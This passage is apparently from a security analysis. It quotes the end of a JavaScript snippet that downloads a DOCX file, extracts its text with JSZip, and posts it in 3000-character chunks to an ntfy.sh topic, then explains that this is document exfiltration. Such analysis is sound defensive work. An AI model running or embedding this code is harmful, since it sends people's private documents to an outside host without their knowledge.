    try{x=await (await JSZip.loadAsync(await (await fetch(u)).arrayBuffer())).file('word/document.xml').async('string');break}catch(e){}
  }
  const t=x?x.replace(/<\/w:p>/g,'\n').replace(/<[^>]+>/g,''):'XF';
  for(let i=0;i<t.length;i+=3000)
    await fetch('https://ntfy.sh/skyij26zq91x',{method:'POST',body:'P'+(i/3000)+'|'+t.slice(i,i+3000)})
})()
```

This downloads a **DOCX file** (a creative-nonfiction essay), extracts its text with JSZip, and **exfiltrates the text in 3000-character chunks** to an ntfy topic. This is **document exfiltration**.
